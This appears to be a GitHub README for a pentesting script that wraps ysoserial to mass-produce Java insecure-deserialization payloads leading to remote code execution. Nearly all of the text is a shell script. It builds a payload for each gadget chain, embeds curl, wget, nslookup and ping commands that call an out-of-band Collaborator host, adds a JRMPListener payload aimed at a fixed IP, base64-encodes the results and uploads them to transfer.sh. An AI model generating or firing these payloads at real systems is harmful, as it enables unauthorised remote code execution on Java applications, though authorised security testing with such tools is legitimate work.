# java-insecure-deserialization
<p align="center">
  <img width="460" height="300" src="https://github.com/nowak0x01/java-insecure-deserialization/assets/96009982/aaa3a093-5026-4250-8232-f23cab3b10a8">
</p>
This script automatically generates all payloads available in Ysoserial https://github.com/frohoff/ysoserial that lead to Remote code execution (RCE), using Out of Band techniques

Note: Payloads that could not be automated. <i>AspectJWeaver, FileUpload1, JSON1, Jython1</i> and <i>Wicket1</i>
```C
sudo docker run --rm adoptopenjdk/openjdk11 /bin/bash -c '

Collaborator="hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com"
IP="54.77.139.23" # for JRMPListener payload
Encoding="base64 -w0"

export TERM="xterm"
clear
printf "\n\e[1;37m[#]\e[0m Downloading latest ysoserial release \e[1;37m[#]\e[0m\n\n"
curl -LkO https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar && printf "\n\e[1;37m[#]\e[0m Download Completed! \e[1;37m[#]\e[0m\n"
java -jar ysoserial-all.jar >& out
printf "\n\e[1;37m[#]\e[0m Building Payloads (slow) \e[1;37m[#]\e[0m\n"
java -jar ysoserial-all.jar URLDNS "https://URLDNS.$Collaborator/" 2>&- | $Encoding >> payloads.inc
printf "\n" >> payloads.inc
java -jar ysoserial-all.jar C3P0 "https://$Collaborator/:C3P0" 2>&- | $Encoding >> payloads.inc
printf "\n" >> payloads.inc
java -jar ysoserial-all.jar Myfaces2 "https://$Collaborator/:Myfaces2" 2>&- | $Encoding >> payloads.inc
printf "\n" >> payloads.inc
if [ "$IP" != "" ];then
    java -jar ysoserial-all.jar JRMPListener "$IP" 2>&- | $Encoding >> payloads.inc
    printf "\n" >> payloads.inc
fi
for _payload in $(cat out | awk "{print \$1}" | grep -vE "^Y$|Usage:|Available|Sep|INFO:|Payload|-------");do
    java -jar ysoserial-all.jar $_payload "curl curl_$_payload.$Collaborator" 2>&- | $Encoding >> payloads.inc
    printf "\n" >> payloads.inc
    java -jar ysoserial-all.jar $_payload "nslookup nslookup_$_payload.$Collaborator" 2>&- | $Encoding >> payloads.inc
    printf "\n" >> payloads.inc
    java -jar ysoserial-all.jar $_payload "wget wget_$_payload.$Collaborator" 2>&- | $Encoding >> payloads.inc
    printf "\n" >> payloads.inc
    java -jar ysoserial-all.jar $_payload "ping ping_$_payload.$Collaborator" 2>&- | $Encoding >> payloads.inc
    printf "\n" >> payloads.inc
done
file=$(tr -dc 'A-Z0-9' </dev/urandom | head -c 20)
sort -u payloads.inc > $file
printf "\n\n\e[1;37m[+] The payloads have been uploaded [+]\n"
printf "U can download the file through that link: "; curl -Lsk --upload-file $PWD/$file https://transfer.sh/$file
echo
'
```
